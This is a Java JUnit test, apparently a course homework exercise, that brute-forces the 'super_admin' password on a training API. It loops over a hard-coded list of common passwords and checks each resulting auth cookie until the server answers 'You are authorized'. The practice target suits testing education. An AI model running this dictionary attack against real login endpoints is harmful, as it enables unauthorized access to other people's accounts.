import com.fasterxml.jackson.core.PrettyPrinter;
import io.restassured.RestAssured;
import io.restassured.internal.support.FileReader;
import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import io.restassured.response.ResponseBody;
import org.apache.commons.lang3.ArrayUtils;
import org.junit.jupiter.api.Test;

import java.io.BufferedReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;


public class HelloWorldTest {




    @Test
    public void HomeworkEx9()  {



        String[] jsonData = {"password","123456","baseball","iloveyou","123123","1234567","welcome","login","admin","princess","abc123","111111","trustno1","monkey","1234567890","qwerty123","123456789","12345678","12345","qwerty","football","letmein","1234","dragon","sunshine","adobe123","solo","1q2w3e4r","master","666666","photoshop","1qaz2wsx","qwertyuiop","ashley","mustang","121212","starwars","654321","bailey","access","flower","555555","passw0rd","shadow","lovely","7777777","michael","!@#$%^&*","jesus","password1","superman","hello","charlie","888888","696969","hottie","freedom","aa123456","qazwsx","ninja","azerty","loveme","whatever","donald","batman","zaq1zaq1","000000","123qwe"};
        String answer = "You are authorized";
        String result1 = null;


        for (int i = 0; i < jsonData.length; i++) {
            Map<String, Object> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", jsonData[i]);

            //System.out.println(data);
            Response responseFirstRequest = RestAssured
                    .given()
                    .body(data)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String cookie = responseFirstRequest.getCookie("auth_cookie");


            Map<String, String> Token1 = new HashMap<>();
            Token1.put("auth_cookie", cookie);

            Response responseSecondRequest = RestAssured
                    .given()
                    .cookies(Token1)
                    .get("https://playground.learnqa.ru/api/check_auth_cookie")
                    .andReturn();

              result1 = responseSecondRequest.getBody().asString();

            if (result1.equals(answer)) {
                System.out.println("password is " + jsonData[i]);
                break;
            }

        }

    }
}
